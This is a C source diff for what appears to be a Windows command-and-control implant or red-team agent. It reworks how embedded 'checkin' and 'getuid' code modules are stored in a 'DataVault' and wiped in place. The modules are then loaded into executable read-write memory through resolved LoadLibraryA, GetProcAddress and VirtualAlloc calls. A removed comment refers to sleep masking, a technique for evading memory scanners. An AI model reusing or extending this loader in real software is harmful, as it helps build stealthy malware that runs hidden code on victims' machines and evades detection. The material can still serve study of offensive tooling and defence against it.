@@ -18,33 +18,40 @@ char * find_getuid_pico() {
     return (char *)&__GETUID_PICO__;
 }
 
-void load_builtin_picos(AgentCapabilities *cap) {
-	char *src_pico;
+void load_builtin_picos(DataVault *vault) {
+	_EMBEDDED_PICO *checkin = (_EMBEDDED_PICO *) find_checkin_pico();
+	add_to_vault(vault, "_builtin_checkin", checkin->value, checkin->length);
+	for (int i = 0; i < checkin->length; i++) { checkin->value[i] = 0; }
 	
+	_EMBEDDED_PICO *getuid = (_EMBEDDED_PICO *) find_getuid_pico();
+	add_to_vault(vault, "_builtin_getuid", getuid->value, getuid->length);
+	for (int i = 0; i < getuid->length; i++) { getuid->value[i] = 0; }
+}
+
+ResolvedPico resolve_loaded_pico(DataVault *vault, char *key) {
 	WIN32FUNCS funcs;
 	funcs.LoadLibraryA = (__typeof__(LoadLibraryA) *) KERNEL32$LoadLibraryA;
 	funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
 	funcs.VirtualAlloc = (__typeof__(VirtualAlloc) *) KERNEL32$VirtualAlloc;
 	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
+
+	DataBuffer databuf = { 0 };
+	retrieve_from_vault(vault, &databuf, key);
+	char *buf = resolve_databuffer(vault, &databuf);
 	
-	src_pico = find_checkin_pico();
-	cap->CheckinPicoCode = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
-	cap->CheckinPicoData = KERNEL32$VirtualAlloc(NULL, PicoDataSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
-	PicoLoad((IMPORTFUNCS *) &funcs, src_pico, cap->CheckinPicoCode, cap->CheckinPicoData);
-	cap->CheckinPicoEntrypoint = (CHECKIN_PICO) PicoEntryPoint(src_pico, cap->CheckinPicoCode);
+	ResolvedPico pico = { 0 };
+	pico.codelen = PicoCodeSize(buf);
+	pico.code = KERNEL32$VirtualAlloc(NULL, pico.codelen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
+	pico.datalen = PicoDataSize(buf);
+	pico.data = KERNEL32$VirtualAlloc(NULL, pico.datalen, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
 	
-	src_pico = find_getuid_pico();
-	cap->GetuidPicoCode = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
-	cap->GetuidPicoData = KERNEL32$VirtualAlloc(NULL, PicoDataSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
-	PicoLoad((IMPORTFUNCS *) &funcs, src_pico, cap->GetuidPicoCode, cap->GetuidPicoData);
-	cap->GetuidPicoEntrypoint = (GETUID_PICO) PicoEntryPoint(src_pico, cap->GetuidPicoCode);
+	PicoLoad((IMPORTFUNCS *) &funcs, buf, pico.code, pico.data);
+	pico.entrypoint = PicoEntryPoint(buf, pico.code);
 	
-	// TODO I probably want these to be a contiguous block of memory for sleepmasking, rather than a bunch of small allocations. I should re-implement with my DataVault struct.
+	return pico;
 }
 
-void free_builtin_picos(AgentCapabilities *cap) {
-	KERNEL32$VirtualFree(cap->CheckinPicoCode, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(cap->CheckinPicoData, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(cap->GetuidPicoCode, 0, MEM_RELEASE);
-	KERNEL32$VirtualFree(cap->GetuidPicoData, 0, MEM_RELEASE);
+void free_resolved_pico(ResolvedPico *pico) {
+	KERNEL32$VirtualFree(pico->code, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(pico->data, 0, MEM_RELEASE);
 }
